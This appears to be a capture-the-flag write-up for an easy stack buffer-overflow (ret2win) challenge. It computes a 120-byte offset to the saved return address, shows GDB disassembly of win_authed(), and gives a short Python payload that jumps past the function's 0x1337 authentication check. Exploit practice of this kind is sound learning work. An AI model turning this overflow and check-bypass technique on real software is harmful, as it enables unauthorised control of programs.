# Easy — Ret2Win / win_authed

Base pointer:

```text
RBP = 0x7ffedd1c0510
```

Input buffer:

```text
0x7ffedd1c04a0
```

The buffer is 94 bytes long.

The goal is to make the program execute `win_authed()` by overwriting the saved return address.

The saved RIP is at:

```text
0x7ffedd1c0518
```

### Offset

```text
saved RIP - input buffer

0x7ffedd1c0518 - 0x7ffedd1c04a0
= 0x78
= 120 bytes
```

So:

```text
input buffer
↓
120 bytes
↓
saved RIP
```

We need 120 bytes of padding, followed by the address we want RIP to use.

The `win_authed()` function also expects:

```text
0x1337
```

as its argument.

---

## win_authed()

From GDB:

```asm
endbr64
push   %rbp
mov    %rsp,%rbp
sub    $0x10,%rsp
mov    %edi,-0x4(%rbp)

cmpl   $0x1337,-0x4(%rbp)
jne    0x4020a1 <win_authed+282>

lea    0x1146(%rip),%rdi        # 0x4030f0
call   0x401100 <puts@plt>
```

`win_authed()` checks whether its argument is `0x1337`.

Since the normal entry performs this authentication check, we can start execution at:

```text
0x401fa3
```

This skips the authentication check and starts at the code that prints the winning message.

---

## From GDB

Address of `win_authed()`:

```text
0x0000000000401f87
```

Address to start execution after the authentication check:

```text
0x401fa3
```

---

## Buffer

```text
buffer   = 0x7ffedd1c04a0
saved RIP = 0x7ffedd1c0518
```

Offset:

```text
0x518 - 0x4a0
= 0x78
= 120 bytes
```

Then overwrite the saved RIP with the address we want to execute:

```text
120 bytes padding
+
8 bytes address
```

---

## Exploit

```python
import sys
import struct

payload = b"A" * 120
payload += struct.pack("<Q", 0x401fa3)

sys.stdout.buffer.write(payload)
```

Little-endian:

```text
0x401fa3
↓
address written into saved RIP
```
